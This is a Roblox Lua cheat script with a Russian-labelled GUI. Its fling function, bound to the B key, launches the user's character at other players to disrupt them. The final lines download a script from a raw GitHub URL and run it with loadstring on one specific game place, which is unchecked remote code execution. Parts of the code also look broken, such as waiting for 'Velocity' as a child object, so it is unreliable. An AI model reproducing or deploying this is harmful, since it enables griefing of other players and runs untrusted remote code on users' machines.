local Player = game:GetService("Players").LocalPlayer
local UIS = game:GetService("UserInputService")

-- GUI Setup
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local ToggleButton = Instance.new("TextButton")
local FlingButton = Instance.new("TextButton")
local DragHandle = Instance.new("TextLabel")
local StrengthLabel = Instance.new("TextLabel")
local Dropdown = Instance.new("TextButton")
local LOSCheckbox = Instance.new("TextButton")

-- Configuration
local flingPower = 10000
local powerOptions = {5000, 10000, 20000, 50000}
local checkWalls = true

ScreenGui.Parent = game:GetService("CoreGui")
Frame.Parent = ScreenGui
Frame.Size = UDim2.new(0, 220, 0, 180)
Frame.Position = UDim2.new(0.5, -110, 0.5, -90)
Frame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
Frame.Active = true
Frame.Draggable = true

-- Drag Handle
DragHandle.Parent = Frame
DragHandle.Size = UDim2.new(1, 0, 0, 20)
DragHandle.Text = "Drag Me"
DragHandle.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)

-- Fling Button
FlingButton.Parent = Frame
FlingButton.Size = UDim2.new(0.8, 0, 0, 40)
FlingButton.Position = UDim2.new(0.1, 0, 0.2, 0)
FlingButton.Text = "FLING (B)"
FlingButton.BackgroundColor3 = Color3.new(0.8, 0, 0)

-- GUI Controls
ToggleButton.Parent = Frame
ToggleButton.Size = UDim2.new(0.2, 0, 0, 20)
ToggleButton.Position = UDim2.new(0.8, 0, 0, 0)
ToggleButton.Text = "X"

StrengthLabel.Parent = Frame
StrengthLabel.Size = UDim2.new(0.8, 0, 0, 20)
StrengthLabel.Position = UDim2.new(0.1, 0, 0.5, 0)
StrengthLabel.Text = "Сила: "..flingPower
StrengthLabel.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)

Dropdown.Parent = Frame
Dropdown.Size = UDim2.new(0.8, 0, 0, 25)
Dropdown.Position = UDim2.new(0.1, 0, 0.65, 0)
Dropdown.Text = "Выбрать силу ▼"
Dropdown.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4)

LOSCheckbox.Parent = Frame
LOSCheckbox.Size = UDim2.new(0.8, 0, 0, 25)
LOSCheckbox.Position = UDim2.new(0.1, 0, 0.8, 0)
LOSCheckbox.Text = "Стены: ВКЛ ✓"
LOSCheckbox.BackgroundColor3 = Color3.new(0, 0.5, 0)

-- Drag Logic
local dragging = false
local dragInput, dragStart, startPos

Frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = Frame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

Frame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

UIS.InputChanged:Connect(function(input)
    if dragging and input == dragInput then
        local delta = input.Position - dragStart
        Frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

-- Fling Logic
local function updatePower(power)
    flingPower = power
    StrengthLabel.Text = "Сила: "..power
end

LOSCheckbox.MouseButton1Click:Connect(function()
    checkWalls = not checkWalls
    LOSCheckbox.Text = checkWalls and "Стены: ВКЛ ✓" or "Стены: ВЫКЛ ✗"
    LOSCheckbox.BackgroundColor3 = checkWalls and Color3.new(0, 0.5, 0) or Color3.new(0.5, 0, 0)
end)

Dropdown.MouseButton1Click:Connect(function()
    for i, power in pairs(powerOptions) do
        local option = Instance.new("TextButton")
        option.Parent = Frame
        option.Size = UDim2.new(0.8, 0, 0, 25)
        option.Position = UDim2.new(0.1, 0, 0.65 + (i*0.07), 0)
        option.Text = power
        option.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
        option.MouseButton1Click:Connect(function()
            updatePower(power)
            option:Destroy()
        end)
    end
end)

function fling()
    if not Player.Character or not Player.Character:FindFirstChild("HumanoidRootPart") then return end
    
    local origin = Player.Character.HumanoidRootPart.Position
    local params = RaycastParams.new()
    params.FilterType = Enum.RaycastFilterType.Exclude
    params.FilterDescendantsInstances = {Player.Character}

    for _, target in pairs(game.Players:GetPlayers()) do
        if target ~= Player and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
            local targetPos = target.Character.HumanoidRootPart.Position
            
            if checkWalls then
                local ray = workspace:Raycast(origin, (targetPos - origin).Unit * 500, params)
                if not (ray and ray.Instance:IsDescendantOf(target.Character)) then continue end
            end

            Player.Character.HumanoidRootPart.Velocity = Vector3.new(flingPower, flingPower, flingPower)
            task.wait(0.05)
            Player.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
        end
    end
end

-- Keybinds & Core
UIS.InputBegan:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.B then fling() end
end)

FlingButton.MouseButton1Click:Connect(fling)
ToggleButton.MouseButton1Click:Connect(function() Frame.Visible = not Frame.Visible end)

Player.CharacterAdded:Connect(function()
    repeat task.wait() until Player.Character:FindFirstChild("HumanoidRootPart")
    Player.Character.HumanoidRootPart:WaitForChild("Velocity")
end)

if game.PlaceId == 2788229376 then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/fakeURL/antiAFK.txt"))()
end
